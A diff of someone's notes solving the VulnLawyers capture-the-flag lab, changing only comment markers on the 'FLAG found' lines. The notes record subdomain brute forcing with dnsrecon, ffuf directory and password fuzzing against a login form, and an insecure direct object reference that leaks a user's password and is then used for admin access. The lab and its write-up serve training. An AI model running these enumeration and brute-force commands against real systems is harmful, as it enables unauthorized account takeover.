@@ -32,7 +32,7 @@ dnsrecon -d vulnlawyers.co.uk -D ~/wordlist/subdomains.txt -t brt
 
 {"name":"VulnLawyers Website API","version":"2.1.04","flag":"[^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^]"}
 
-//#1 FLAG found
+#1 FLAG found
 
 
 
@@ -62,7 +62,7 @@ Access is denied from your ip address.
 
 curl  http://www.vulnlawyers.co.uk /login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
 
-//#2 FLAG found
+#2 FLAG found
 
 Access to this portal can now be found here <a href=/lawyers-only"
 
@@ -98,13 +98,13 @@ ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNG
 //contents found: users
 curl  http://data.vulnlawyers.co.uk/users -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
 {"users":[{"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk"},{"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk"},{"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk"},{"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk"},{"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk"}],"flag":"[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^]"}
-//#3 FLAG Found
+#3 FLAG Found
 
 -----------------------------------
 
 //Fuzzing all users with ffuf. Found password for Jaskaran Lowe. Password: summer.
 ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=jaskaran.lowe@vulnlawyers.co.uk@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
-//#4 Flag Found
+#4 FLAG Found
 
 -----------------------------------
 
@@ -113,11 +113,11 @@ ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfcha
 //Accessing users by id:
 //http://vulnlawyers.co.uk/lawyers-only-profile-details/2
 //Result: {"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
-//#5 FLAG Found
+#5 FLAG Found
 
 -----------------------------------
 //Accessing the page as admin with credentials:
 //email: shayne.cairns@vulnlawyers.co.uk
 //password: q2V944&#2a1^3p
 //Deleting case...
-//#6 FLAG Found
+#6 FLAG Found
